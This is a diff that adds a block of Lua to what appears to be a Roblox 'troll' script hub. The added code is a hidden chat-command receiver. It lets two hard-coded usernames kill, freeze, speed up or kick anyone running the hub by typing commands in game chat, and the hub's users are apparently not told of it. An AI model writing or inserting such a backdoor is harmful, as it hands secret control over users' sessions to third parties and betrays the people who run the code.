@@ -902,3 +902,66 @@ Troll:AddToggle({
     end
 })
 
+-- HUB NORMAL (RECEPTORA)
+
+local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
+
+local lp = Players.LocalPlayer
+
+-- 🔐 whitelist (quem pode mandar comandos)
+local admins = {
+    ["luiskkj998"] = true,
+    ["tokitooff29"] = true
+}
+
+-- pegar canal
+local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+    or TextChatService.TextChannels:GetChildren()[1]
+
+local function getSender(msgData)
+    -- tenta obter nome do remetente (API nova)
+    if msgData.TextSource and msgData.TextSource.Name then
+        return msgData.TextSource.Name
+    end
+    return nil
+end
+
+local function onMessage(msgData)
+    local sender = getSender(msgData)
+    if not sender or not admins[sender] then return end -- bloqueia desconhecidos
+
+    local msg = string.lower(msgData.Text or "")
+    local me = string.lower(lp.Name)
+
+    -- /kill Nome
+    if msg:match("^/kill%s+" .. me) then
+        local hum = lp.Character and lp.Character:FindFirstChildOfClass("Humanoid")
+        if hum then hum.Health = 0 end
+    end
+
+    -- /freeze Nome
+    if msg:match("^/freeze%s+" .. me) then
+        local hrp = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
+        if hrp then hrp.Anchored = true end
+    end
+
+    -- /unfreeze Nome
+    if msg:match("^/unfreeze%s+" .. me) then
+        local hrp = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
+        if hrp then hrp.Anchored = false end
+    end
+
+    -- /speed Nome  (fixo em 100)
+    if msg:match("^/speed%s+" .. me) then
+        local hum = lp.Character and lp.Character:FindFirstChildOfClass("Humanoid")
+        if hum then hum.WalkSpeed = 100 end
+    end
+
+    -- /kick Nome (client-side)
+    if msg:match("^/kick%s+" .. me) then
+        lp:Kick("Removido via comando")
+    end
+end
+
+channel.MessageReceived:Connect(onMessage)
